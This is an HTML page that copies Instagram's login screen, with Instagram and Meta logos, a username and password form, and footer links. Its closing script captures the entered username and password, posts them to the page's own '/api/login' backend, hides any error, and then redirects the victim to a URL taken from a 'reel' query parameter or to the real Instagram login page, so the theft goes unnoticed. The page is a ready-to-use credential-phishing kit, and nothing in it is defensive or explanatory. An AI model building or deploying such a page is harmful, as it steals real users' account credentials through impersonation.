<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* 1. ADAPTIVE COLOR VARIABLES */
        :root {
            --bg-page: #ffffff;
            --text-primary: #000000;
            --text-secondary: #737373;
            --input-bg: #fafafa;
            --border-color: #dbdbdb;
            --btn-blue: #0095f6;
            --logo-filter: none;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-page: #000000;
                --text-primary: #f5f5f5;
                --text-secondary: #a8a8a8;
                --input-bg: #121212;
                --border-color: #262626;
                --btn-blue: #00376b;
                --logo-filter: invert(1);
            }
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background-color: var(--bg-page);
            color: var(--text-primary);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            transition: background-color 0.3s ease;
        }

        /* TOP LEFT ICON */
        .top-left-icon {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 28px;
            filter: var(--logo-filter);
        }

        main {
            display: flex;
            flex: 1;
            align-items: center;
            justify-content: center;
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
            padding: 20px;
        }

        /* LEFT SIDE: PROMO */
        .promo-side {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding-right: 40px;
        }

        .insta-glyph { width: 60px; margin-bottom: 40px; filter: var(--logo-filter); }

        .promo-text {
            font-size: 38px;
            font-weight: 600;
            line-height: 1.2;
            margin-bottom: 40px;
            max-width: 450px;
        }

        .promo-text span.orange { color: #ff8a00; }
        .promo-text span.pink { color: #ff006e; }

        .promo-img { width: 320px; }

        /* RIGHT SIDE: LOGIN FORM */
        .login-side {
            width: 400px;
            padding: 40px;
            display: flex;
            flex-direction: column;
        }

        .login-header { font-size: 16px; font-weight: 600; margin-bottom: 24px; }

        .input-group { margin-bottom: 12px; }

        input {
            width: 100%;
            background: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            padding: 12px;
            font-size: 14px;
            outline: none;
        }

        .login-btn {
            background-color: var(--btn-blue);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            cursor: pointer;
            margin: 12px 0;
            width: 100%;
        }

        .forgot-link {
            font-size: 14px;
            color: var(--text-primary);
            text-decoration: none;
            text-align: center;
            margin: 12px 0 40px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            border: 1px solid var(--border-color);
            background: transparent;
            color: var(--text-primary);
            padding: 10px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .create-account {
            width: 100%;
            border: 1px solid var(--border-color);
            background: transparent;
            color: #0095f6;
            padding: 10px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
        }

        .meta-logo { width: 60px; align-self: center; margin-top: 10px; filter: var(--logo-filter); }

        footer {
            padding: 24px;
            text-align: center;
            font-size: 12px;
            color: var(--text-secondary);
        }

        footer a { color: var(--text-secondary); text-decoration: none; margin: 0 8px; }

        @media (max-width: 850px) {
            main { flex-direction: column; padding-top: 60px; }
            .promo-side { padding-right: 0; margin-bottom: 40px; }
            .promo-text { font-size: 28px; }
            .top-left-icon { display: none; }
        }
    </style>
</head>
<body>

<img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="top-left-icon" alt="Insta">

<main>
    <div class="promo-side">
        <img src="logo.png" class="insta-glyph" alt="Logo">
        <h1 class="promo-text">
            See everyday moments from your <span class="orange">close</span> <span class="pink">friends</span>.
        </h1>
        <img src="https://i.imgur.com/GisLhN6.png" class="promo-img" alt="Stories Preview">
    </div>

    <div class="login-side">
        <h2 class="login-header">Log into Instagram</h2>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Mobile number, username or email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        <a href="#" class="forgot-link">Forgot password?</a>
        <button type="button" class="fb-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="16">
            Log in with Facebook
        </button>
        <button type="button" class="create-account">Create new account</button>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
    </div>
</main>

<footer>
    <div><a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Privacy</a> <a href="#">Terms</a></div>
    <div style="margin-top: 15px;">English ∨ &nbsp; © 2026 Instagram from Meta</div>
</footer>

<script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        try {
            // Send data to your backend API
            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user, pass })
            });
        } catch (error) {
            console.error('API Error:', error);
        }

        // Handle Redirection
        const params = new URLSearchParams(window.location.search);
        const nextLink = params.get('reel');
        window.location.href = nextLink || "https://www.instagram.com/accounts/login/";
    });
</script>

</body>
</html>
